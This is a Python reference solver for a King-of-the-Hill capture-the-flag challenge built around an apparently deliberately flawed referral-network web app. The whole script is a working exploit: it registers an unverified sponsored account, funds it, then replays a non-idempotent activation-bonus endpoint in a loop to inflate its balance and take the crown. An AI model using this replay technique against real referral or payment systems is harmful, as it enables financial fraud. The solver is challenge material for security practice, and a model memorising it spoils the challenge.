#!/usr/bin/env python3
"""Reference "holder" for the Réseau Fortune KotH hill.

Demonstrates that a team can mint its way to the top and be crowned. Uses the
non-idempotent activation bonus (bug A); refund arbitrage (bug B) is an
independent path (see README). Unlike a jeopardy solver there is no flag: the
proof is that /king returns our token once we are the richest network.

Usage:
  python3 solve.py http://HILL:PORT <koth_token> [scorer_secret] [target_gain]

If scorer_secret is given, the script confirms /king crowns our token.
"""
import sys
import time

import requests

PRIME = 3_000


def _post(s, url, **kw):
    """POST with a small backoff if the arena's rate limit (429) kicks in."""
    for _ in range(1000):
        r = s.post(url, **kw)
        if r.status_code != 429:
            return r
        time.sleep(1.0)
    return r


def solve(base, token, scorer_secret=None, target=1_000_000):
    base = base.rstrip("/")
    s = requests.Session()

    # join the shared arena with our KotH token -> seeded distributor account
    _post(s, f"{base}/api/join", json={"token": token}).raise_for_status()
    root = s.get(f"{base}/api/me").json()["code"]

    # register + fund + activate one filleul under us (phone never verified)
    reg = _post(
        s, f"{base}/api/register", json={"phone": "22890000002", "parrain_code": root}
    )
    reg.raise_for_status()
    filleul_code = reg.json()["code"]
    _post(
        s, f"{base}/api/transfer", json={"to_code": filleul_code, "montant": 5_000}
    ).raise_for_status()
    _post(s, f"{base}/api/login", json={"phone": "22890000002"}).raise_for_status()
    _post(
        s, f"{base}/api/buy", json={"product": "starter", "qty": 1}
    ).raise_for_status()

    # back to our root, replay the bonus past the target gain
    _post(s, f"{base}/api/join", json={"token": token}).raise_for_status()
    while s.get(f"{base}/api/me").json()["net_gain"] < target:
        _post(s, f"{base}/api/bonus/activation", json={"filleul_code": filleul_code})

    gain = s.get(f"{base}/api/me").json()["net_gain"]
    print(f"net_gain={gain}")

    if scorer_secret:
        r = requests.get(f"{base}/king", headers={"X-Scorer-Token": scorer_secret})
        crowned = r.json().get("token")
        print(
            f"/king token={crowned} (ours={token}) -> {'CROWNED' if crowned == token else 'not us'}"
        )
        return 0 if crowned == token else 1
    return 0


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(__doc__)
        sys.exit(2)
    base = sys.argv[1]
    token = sys.argv[2]
    secret = sys.argv[3] if len(sys.argv) > 3 else None
    target = int(sys.argv[4]) if len(sys.argv) > 4 else 1_000_000
    sys.exit(solve(base, token, secret, target))
